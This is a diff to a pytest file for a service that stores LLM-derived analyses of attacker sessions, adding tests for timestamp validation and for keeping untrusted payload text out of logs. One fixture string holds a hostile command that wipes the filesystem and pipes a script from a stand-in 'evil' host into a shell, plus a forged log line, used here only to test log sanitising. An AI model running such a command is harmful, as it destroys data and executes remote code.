@@ -1,3 +1,4 @@
+import logging
 import uuid
 from datetime import datetime, timezone
 
@@ -16,7 +17,12 @@ from app.db.models import (
 )
 from app.db.session import get_session_factory
 from app.services.llm.schemas import EvidenceCitation
-from app.services.persistence import Claim, load_evidence, persist_analysis
+from app.services.persistence import (
+    Claim,
+    NaiveTimestampError,
+    load_evidence,
+    persist_analysis,
+)
 
 NOW = datetime(2026, 8, 20, 10, 0, 30, tzinfo=timezone.utc)
 TIMESTAMPS = {"e-wget": NOW, "e-uname": NOW}
@@ -411,4 +417,93 @@ async def test_load_evidence_returns_refs_for_a_parent() -> None:
 
     refs = await load_evidence(ParentType.TECHNIQUE_MAPPING, mapping.id)
     assert [r.es_event_id for r in refs] == ["e-wget"]
+    await _cleanup(analysis.id)
+
+
+@pytest.mark.asyncio
+async def test_naive_event_timestamp_is_rejected() -> None:
+    """A tz-naive value in event_timestamps must be refused loudly.
+
+    DateTime(timezone=True) columns don't reject a naive Python datetime the
+    way asyncpg rejects an aware value against a naive column -- Postgres
+    silently reinterprets it in the session's local timezone instead,
+    storing a different instant with no error. persist_analysis must catch
+    this itself, before it ever reaches the database.
+    """
+    analysis = _analysis()
+    naive_timestamps = {"e-wget": datetime(2026, 8, 20, 10, 0, 30)}  # noqa: DTZ001 -- deliberately naive
+
+    with pytest.raises(NaiveTimestampError, match="e-wget"):
+        await persist_analysis(
+            analysis, [_grounded_claim()], [], "seed-botnet-01", naive_timestamps
+        )
+
+    # The guard runs before any session is opened -- nothing should exist.
+    factory = get_session_factory()
+    async with factory() as db:
+        stored = await db.get(Analysis, analysis.id)
+    assert stored is None
+
+
+@pytest.mark.asyncio
+async def test_aware_event_timestamp_is_accepted() -> None:
+    """The naive-timestamp guard must not over-reject a normal, tz-aware call."""
+    analysis = _analysis()
+    rejected = await persist_analysis(
+        analysis, [_grounded_claim()], [], "seed-botnet-01", TIMESTAMPS
+    )
+    assert rejected == 0
+
+    factory = get_session_factory()
+    async with factory() as db:
+        mapping = (
+            (
+                await db.execute(
+                    select(TechniqueMapping).where(
+                        TechniqueMapping.analysis_id == analysis.id
+                    )
+                )
+            )
+            .scalars()
+            .one()
+        )
+    assert mapping.technique_id == "T1105"
+    await _cleanup(analysis.id)
+
+
+@pytest.mark.asyncio
+async def test_rejected_claim_log_contains_no_payload_content(
+    caplog: pytest.LogCaptureFixture,
+) -> None:
+    """A rejected claim's log line must carry only structural facts.
+
+    claim.payload is freeform LLM-derived text that can echo attacker
+    command text verbatim (ObservedBehavior.label, SuspiciousIndicator.label).
+    Logging it raw would (a) let attacker-influenced content forge log lines
+    via embedded control characters, and (b) leak content from a claim we
+    deliberately chose not to store. The log line must name kind, session,
+    and citation count only.
+    """
+    analysis = _analysis()
+    sensitive = "rm -rf / ; curl http://evil/x.sh | sh -- \n[FORGED] admin login ok"
+    ungrounded = Claim(
+        kind=ParentType.OBSERVED_BEHAVIOR,
+        payload={"label": sensitive},
+        evidence=[],
+    )
+
+    with caplog.at_level(logging.WARNING, logger="app.services.persistence"):
+        rejected = await persist_analysis(
+            analysis, [ungrounded], [], "seed-botnet-01", TIMESTAMPS
+        )
+    assert rejected == 1
+
+    warning_text = "\n".join(
+        record.getMessage() for record in caplog.records if record.levelno == logging.WARNING
+    )
+    assert warning_text, "expected a warning to be logged for the rejected claim"
+    assert sensitive not in warning_text
+    assert "rm -rf" not in warning_text
+    assert "observed_behavior" in warning_text
+    assert "seed-botnet-01" in warning_text
     await _cleanup(analysis.id)
